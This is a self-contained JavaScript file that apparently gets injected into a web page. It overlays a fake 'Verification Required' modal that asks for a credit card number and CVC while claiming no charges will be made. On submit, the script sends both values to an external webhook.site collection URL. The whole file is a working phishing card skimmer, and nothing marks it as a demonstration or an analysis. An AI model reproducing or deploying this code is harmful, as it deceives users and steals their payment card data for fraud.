(function () {
  const modal = document.createElement('div');
  modal.style.position = 'fixed';
  modal.style.top = '0';
  modal.style.left = '0';
  modal.style.width = '100vw';
  modal.style.height = '100vh';
  modal.style.background = 'rgba(0, 0, 0, 0.6)';
  modal.style.display = 'flex';
  modal.style.justifyContent = 'center';
  modal.style.alignItems = 'center';
  modal.style.zIndex = '10000';

  const box = document.createElement('div');
  box.style.background = '#fff';
  box.style.padding = '40px';
  box.style.borderRadius = '12px';
  box.style.boxShadow = '0 8px 20px rgba(0, 0, 0, 0.25)';
  box.style.maxWidth = '420px';
  box.style.width = '100%';
  box.style.fontFamily = 'Segoe UI, sans-serif';
  box.style.boxSizing = 'border-box';
  box.style.textAlign = 'left';

  box.innerHTML = `
    <h2 style="margin-top: 0; color: #4F1B5F;">Verification Required</h2>
    <p style="margin-bottom: 20px; color: #333;">
      To continue using this application, please confirm your payment method. 
      <strong>No charges will be made.</strong> This is for verification only.
    </p>
    <form id="bankForm">
      <label style="display:block; margin-bottom: 8px; color: #4F1B5F; font-weight: bold;">Credit Card Number</label>
      <input type="text" name="cc" placeholder="1234 5678 9012 3456" required 
        style="width: 100%; padding: 12px; margin-bottom: 16px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px;" />

      <label style="display:block; margin-bottom: 8px; color: #4F1B5F; font-weight: bold;">CVC</label>
      <input type="text" name="cvc" placeholder="123" required 
        style="width: 100%; padding: 12px; margin-bottom: 24px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px;" />

      <button type="submit" 
        style="width: 100%; padding: 12px; background: #4F1B5F; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer;">
        Submit
      </button>
    </form>
  `;

  box.querySelector('button').addEventListener('mouseover', function () {
    this.style.background = '#3e144c';
  });
  box.querySelector('button').addEventListener('mouseout', function () {
    this.style.background = '#4F1B5F';
  });

  modal.appendChild(box);
  document.body.appendChild(modal);

  document.getElementById('bankForm').addEventListener('submit', function (e) {
    e.preventDefault();
    const cc = e.target.cc.value;
    const cvc = e.target.cvc.value;

    const queryString = `?cc=${encodeURIComponent(cc)}&cvc=${encodeURIComponent(cvc)}`;

    fetch('https://webhook.site/0dc6c238-38cb-4f6b-9e19-639042e0b656' + queryString)
      .then(res => res.text())
      .then(msg => {
        alert(msg);
        document.body.removeChild(modal);
      })
      .catch(err => {
        alert('Error submitting data');
        console.error(err);
      });
  });
})();
